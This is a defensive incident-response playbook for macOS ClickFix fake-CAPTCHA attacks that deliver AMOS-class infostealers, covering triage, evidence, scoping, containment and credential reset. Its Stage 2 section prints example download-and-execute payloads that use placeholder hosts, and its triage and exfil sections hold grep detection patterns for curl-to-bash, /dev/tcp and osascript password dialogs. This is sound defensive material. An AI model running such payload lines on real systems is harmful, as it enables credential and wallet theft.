# ClickFix / Fake-CAPTCHA and Infostealer Playbook

The end-to-end playbook for the **#1 macOS initial-access technique today**: a fake "Verify you are human" CAPTCHA / "fix this error" / "update required" page tricks the user into **pasting a command into Terminal**, which downloads and runs an **infostealer** (Atomic/AMOS and its clones). One page view → login Keychain, browser cookies/logins, and crypto wallets exfiltrated in seconds.

> 🔴 **This is a credential incident, not a malware incident.** By the time you're triaging, the login Keychain, saved browser passwords, **session cookies**, and wallet keys are almost certainly already exfiltrated. Endpoint cleanup is necessary but *not sufficient* — the case is won or lost at the **IdP and in credential rotation**. Stolen session cookies mean the attacker is **already logged in** past MFA.

## Contents
- [Attack Chain at a Glance](#attack-chain-at-a-glance)
- [Quick Triage (60-second confirm)](#quick-triage-60-second-confirm)
- [Stage 1 — The Lure (fake CAPTCHA / ClickFix)](#stage-1--the-lure-fake-captcha--clickfix)
- [Stage 2 — Paste-and-Run](#stage-2--paste-and-run)
- [Stage 3 — Harvest](#stage-3--harvest)
- [Stage 4 — Exfil](#stage-4--exfil)
- [Identification: Evidence by Source](#identification-evidence-by-source)
- [Scoping: What Was Stolen](#scoping-what-was-stolen)
- [Build the Timeline](#build-the-timeline)
- [Containment and Eradication](#containment-and-eradication)
- [Credential Reset (the part that ends it)](#credential-reset-the-part-that-ends-it)
- [Fleet Hunt (IOCs)](#fleet-hunt-iocs)
- [Red Flags](#red-flags)
- [Resources](#resources)

---

## Attack Chain at a Glance

| Stage | Action | Primary evidence |
|---|---|---|
| 1. Lure | Malvertising/compromised site shows a fake CAPTCHA/error; JS copies a command to the clipboard | Browser history *(separate browser repo)*, quarantine/where-froms |
| 2. Paste-and-run | User opens Terminal, pastes `curl … \| bash` / `osascript` one-liner | **Shell history**, process lineage, Terminal saved state |
| 3. Harvest | Stealer shows a **fake password dialog**, dumps Keychain + browsers + wallets | `osascript`/`security` in unified log, TCC, staging files |
| 4. Exfil | Zip + `curl -F/-d` to C2; optional LaunchAgent persistence; self-clean | Live/logged network, curl in history, LaunchAgents |

MITRE: **T1204.004** (Malicious Copy-Paste / ClickFix) → T1059.004/.002 → T1555 (Keychain/creds) → T1539 (session cookies) → T1041 (exfil).

---

## Quick Triage (60-second confirm)

```bash
# 1. THE SMOKING GUN — pasted download-exec / osascript one-liner in shell history
grep -hriE 'curl .*\|(bash|sh|zsh)|osascript .*(do shell script|display dialog)|base64 -d.*\| *(bash|sh)|nscurl|/dev/tcp' \
  /Users/*/.zsh_history /Users/*/.bash_history /Users/*/.zsh_sessions/* /Users/*/.bash_sessions/* 2>/dev/null

# 2. Fake password prompt via osascript (credential capture) — last 2 days
sudo log show --last 2d --predicate 'process == "osascript"' 2>/dev/null \
  | grep -iE 'display dialog|password|hidden answer|do shell script'

# 3. Live: shell/curl child of Terminal, or a stealer mid-run
pgrep -fl 'osascript|curl|nscurl'
sudo lsof -nP -i | grep ESTABLISHED

# 4. What downloaded recently + from where (the payload + the fake page)
sqlite3 ~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2 \
 "SELECT datetime(LSQuarantineTimeStamp+978307200,'unixepoch') t, LSQuarantineAgentName,
  LSQuarantineDataURLString, LSQuarantineOriginURLString FROM LSQuarantineEvent ORDER BY 1 DESC LIMIT 15;"
```

A `curl … | bash` or `osascript … do shell script` line in history whose parent was **Terminal** ([`15b`](<../15b - Process Trees and Execution Lineage.md>)) is a confirmed ClickFix.

---

## Stage 1 — The Lure (fake CAPTCHA / ClickFix)

Delivery is malvertising, SEO-poisoned "free/cracked app" pages, compromised sites, or a phishing link. The page presents a **fake human-verification / error** and instructs: *"Press ⌘+Space, type Terminal, paste (⌘V), press Return."* JavaScript has silently placed the payload command on the **clipboard**.

```bash
# The referring page + payload URL (macOS Mark-of-the-Web)  → 11 - Artifacts/Download Provenance and Quarantine.md
sqlite3 ~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2 \
 "SELECT datetime(LSQuarantineTimeStamp+978307200,'unixepoch'), LSQuarantineOriginURLString, LSQuarantineDataURLString
  FROM LSQuarantineEvent ORDER BY 1 DESC LIMIT 25;"
# where-froms on any dropped file
mdls -name kMDItemWhereFroms /path/to/suspect 2>/dev/null
```

Browser-side evidence (the CAPTCHA/verification page URL, the redirect chain, the ad network) lives in **browser history — see your separate browser-forensics repo**. Pivot the `LSQuarantineOriginURLString` domain there.

---

## Stage 2 — Paste-and-Run

The clipboard one-liner runs in the user's shell. Recognize the shapes (do **not** execute):

```
# Typical macOS ClickFix payloads:
curl -sSL https://<host>/<rand> | bash
echo <base64blob> | base64 -d | bash
osascript -e 'do shell script "curl -s https://<host>/a | sh"'
# often decorated with a fake "Verification ID: 7F3A…" comment to look legitimate
# newer variants: a single osascript that both prompts for the password AND curls the stage
```

Evidence:
```bash
# Full history incl. per-session stashes (survive a cleared main history)
cat /Users/*/.zsh_history /Users/*/.bash_history 2>/dev/null
ls -la /Users/*/.zsh_sessions /Users/*/.bash_sessions 2>/dev/null    # → 04 - Shells

# Terminal/iTerm saved scrollback (recovers a cleared history)
ls -la /Users/*/Library/Saved\ Application\ State/com.apple.Terminal.savedState/ 2>/dev/null

# Process lineage of the payload (if still running): Terminal → zsh → bash → curl/osascript
#   → 15b - Process Trees and Execution Lineage.md
```

> The tell that separates this from normal admin work: a **shell one-liner that downloads-and-executes**, run interactively under Terminal, immediately followed by `osascript`/`security`/`curl`-exfil activity.

---

## Stage 3 — Harvest

AMOS-class stealers move fast. First a **fake password dialog** (`osascript`) to capture the login password (needed to unlock the Keychain / run `sudo`), then bulk collection.

```bash
# Fake credential dialog
sudo log show --last 2d --predicate 'process == "osascript"' 2>/dev/null | grep -iE 'display dialog|password|hidden answer'

# Keychain dumping / credential reads by unexpected processes
sudo log show --last 2d --predicate 'process == "security"' 2>/dev/null | grep -iE 'find-generic|find-internet|dump|SecKeychain'
# The login keychain the stealer copies
ls -la ~/Library/Keychains/login.keychain-db

# TCC grants/prompts grabbed around the incident (FDA/Accessibility/Desktop-Documents)
#   → 06 - TCC ;  check the user's TCC.db mtime and recent prompts in the log

# Staging dir + archives (payload zips its loot before exfil)
find /tmp /var/tmp "$TMPDIR" /var/folders ~/Library/Caches -type f -mtime -2 \
  \( -name '*.zip' -o -name '*.json' -o -perm -111 \) 2>/dev/null | head -40
```

What AMSO/Atomic-class stealers take:

| Target | Location the stealer reads |
|---|---|
| **Login Keychain** (all stored creds) | `~/Library/Keychains/login.keychain-db` (unlocked with the phished password) |
| **Browser logins/cookies/autofill** | Chrome/Brave/Edge/Firefox profiles; cookies = **session tokens** |
| **Crypto wallets** | Browser extension wallets + desktop wallet apps/keystores |
| **Notes** | `group.com.apple.notes/NoteStore.sqlite` (often holds secrets) |
| **Messaging** | Telegram/Discord local data |
| **Files** | `~/Desktop`, `~/Documents` by extension (`.txt`,`.pdf`,`.key`,`wallet*`,`seed*`) |
| **System profile** | `system_profiler`, hardware UUID, user list |

→ File locations detailed in [`Application and Container Data`](<../11 - Artifacts/Application and Container Data.md>).

---

## Stage 4 — Exfil

```bash
# Live C2 (if still connected) with owning process  → 15 - Live Response
sudo lsof -nP -i | grep -E 'ESTABLISHED|SYN_SENT'
sudo nettop -P -l 1 2>/dev/null | grep -iE 'curl|osascript|<payload>'

# The exfil command in history (POST of the staged archive)
grep -hriE 'curl .*(-F|-d|--data|-T|--upload).*https?://' /Users/*/.zsh_history /Users/*/.bash_history 2>/dev/null

# Network events over time
sudo log show --last 2d --predicate 'subsystem == "com.apple.network"' 2>/dev/null | grep -i '<c2-host-or-ip>'
```

Record the **C2 endpoint** (domain/IP/port) — it's your top IOC for the fleet hunt. Many stealers then `rm -rf` the staging dir and exit (smash-and-grab, no persistence) — absence of persistence does **not** mean nothing happened.

---

## Identification: Evidence by Source

| Source | What it proves | Note |
|---|---|---|
| Shell history / `.*_sessions` | The pasted download-exec one-liner (initial access) | [`04 - Shells`](<../04 - Shells and Command History.md>) |
| Process lineage | Terminal → shell → `curl`/`osascript` (not a service) | [`15b`](<../15b - Process Trees and Execution Lineage.md>) |
| Quarantine DB / where-froms | Payload URL + the **fake CAPTCHA page** (origin URL) | [`Quarantine`](<../11 - Artifacts/Download Provenance and Quarantine.md>) |
| `osascript` in unified log | Fake password dialog (credential capture) | — |
| `security` / TCC in log | Keychain dump + permission grabs | [`06 - TCC`](<../06 - Transparency Consent and Control (TCC).md>) |
| Live network / network log | C2 exfil endpoint | [`15 - Live Response`](<../15 - Live Response and Volatile Data.md>) |
| Staging files (`/tmp`,`/var/folders`) | Payload + loot archive | — |
| Browser history | The CAPTCHA/verification page + redirect chain | **separate browser repo** |
| LaunchAgents (if persistent) | Follow-on persistence | [`hunt_persistence.sh`](../scripts/hunt_persistence.sh) |
| Terminal saved state | Recovers a cleared history | [`04 - Shells`](<../04 - Shells and Command History.md>) |

---

## Scoping: What Was Stolen

Assume-breached priority list — treat each as compromised unless you can prove the stealer failed:

| Assume stolen | Because | Rotate/action |
|---|---|---|
| 🔴 **Everything in the login Keychain** | Unlocked with the phished password | Rotate every stored secret; consider a new keychain |
| 🔴 **Browser session cookies** | Exfiltrated → bypass password+MFA | **Revoke all IdP/app sessions** |
| Browser-saved passwords + autofill | Read from browser profiles | Reset each; sign out everywhere |
| SSO / IdP credentials | Keychain + browser | Reset password, revoke sessions, reset MFA |
| Crypto wallet keys/seed | Wallets are a primary target | Move funds immediately if seed exposed |
| API tokens, SSH keys, cloud CLI creds | `~/.ssh`, `~/.aws`, `~/.config/*` | Revoke + rotate server-side |
| Files in Desktop/Documents | Pattern-based file theft | Assess sensitivity/notify |

---

## Build the Timeline

Stitch the stages into one sequence to confirm and to brief:

```
[browser hist]  visited fake page / ad redirect        (Stage 1)
[quarantine]    payload downloaded from <url>           (Stage 1→2)
[shell hist]    curl … | bash   run under Terminal      (Stage 2)   ← initial access
[osascript log] fake password dialog                    (Stage 3)   ← credential capture
[security/TCC]  Keychain + browser reads                (Stage 3)
[network]       POST to <c2>                            (Stage 4)   ← exfil
```
Anchor times with `knowledgeC`/Terminal usage ([`Program Execution Evidence`](<../11 - Artifacts/Program Execution Evidence.md>)) and FSEvents for the staging writes.

---

## Containment and Eradication

Full procedures in [`16 - Remediation and Containment`](<../16 - Remediation and Containment.md>); the ClickFix-specific short path:

```bash
# 1. Kill any live payload / exfil
sudo pkill -9 -f '<payload-path-or-name>'
sudo lsof -nP -i | grep ESTABLISHED     # confirm C2 dropped

# 2. Remove persistence IF present (most stealers don't persist) — unload+disable+delete, then verify
#    → 16 - Remediation ▸ Remove Persistence ; sweep with:
sudo bash scripts/hunt_persistence.sh deep

# 3. Remove payload + staging + loot archives
rm -rf <staging-dir> <payload>          # from Stage 3/4 findings
```

Endpoint cleanup is the *easy* half. **Do not close the ticket here** — proceed to credential reset.

---

## Credential Reset (the part that ends it)

This is where a ClickFix/stealer case is actually resolved. Detail + commands in [`16 ▸ Credential, SSO, and Session Reset`](<../16 - Remediation and Containment.md>).

1. **Reset the login password** (it was phished) and force a Mac re-login.
2. **The entire login Keychain is burned** — rotate every credential it stored; treat saved passwords, tokens, and certs as public.
3. **At the IdP — revoke ALL active sessions and reset MFA**, then reset the password. Stolen **cookies bypass password + MFA**, so *session revocation is mandatory, not optional*.
4. **Browser passwords**: reset each and **sign out of all sessions** (revoke in the Google/MS account).
5. **Crypto wallets**: if seed phrases/keys were stored, funds are at immediate risk — **move them now** and notify the user.
6. **API keys / SSH keys / cloud CLI tokens** (`~/.ssh`, `~/.aws`, `~/.config/gcloud`, `~/.kube`): revoke and rotate **server-side**.
7. Reset any **shared/service-account** secret the user could reach.

> Order matters: **revoke sessions first** (locks the attacker out immediately), then rotate (prevents re-entry). A password reset without session revocation leaves a live cookie logged in.

---

## Fleet Hunt (IOCs)

ClickFix campaigns are broad — hunt the org for the same lure and payload:

```bash
# Hand these to EDR/SIEM: C2 host/IP, payload SHA-256, origin (fake-page) domain, LaunchAgent label
shasum -a 256 <payload> 2>/dev/null
echo '<c2-host>  <origin-domain>  <launchagent-label>'
```

Hunt across the fleet for: the **origin domain** in proxy/DNS/browser telemetry, the **payload hash**, processes matching `bash`/`osascript` **child of Terminal** running `curl|bash`, and `security find-*-password` executions. → [`17 - macOS Malware and Threat Landscape ▸ Hunting Playbook`](<macOS Malware and Threat Landscape.md>).

---

## Red Flags

| 🔴 Finding | Meaning |
|---|---|
| `curl … \| bash` / `osascript do shell script` in history, parent = **Terminal** | Confirmed ClickFix execution |
| `osascript` **password dialog** near a shell download-exec | Stealer credential capture |
| `security find-*-password` / `dump-keychain` by a non-standard process | Keychain theft |
| Loot **archive in `/tmp` or `/var/folders`** then a `curl -F/-d` POST | Staged exfiltration |
| Quarantine **origin URL** = a CAPTCHA/verification/"cracked app" page | ClickFix lure page |
| Payload downloaded then history cleared / staging `rm -rf` | Smash-and-grab cleanup |
| Everything above with **no persistence** | Normal for stealers — still a full credential breach |

---

## Resources
- [`17 - macOS Malware and Threat Landscape`](<macOS Malware and Threat Landscape.md>) — AMOS/Atomic and clone families, shared TTPs
- [`16 - Remediation and Containment`](<../16 - Remediation and Containment.md>) — full eradication + credential/SSO reset
- [`15b - Process Trees and Execution Lineage`](<../15b - Process Trees and Execution Lineage.md>) · [`15 - Live Response`](<../15 - Live Response and Volatile Data.md>)
- [`11 - Artifacts/Download Provenance and Quarantine`](<../11 - Artifacts/Download Provenance and Quarantine.md>) · [`04 - Shells and Command History`](<../04 - Shells and Command History.md>)
- **Objective-See** — AMOS/Atomic analyses; **term:** "ClickFix" / "fake CAPTCHA" (MITRE T1204.004)
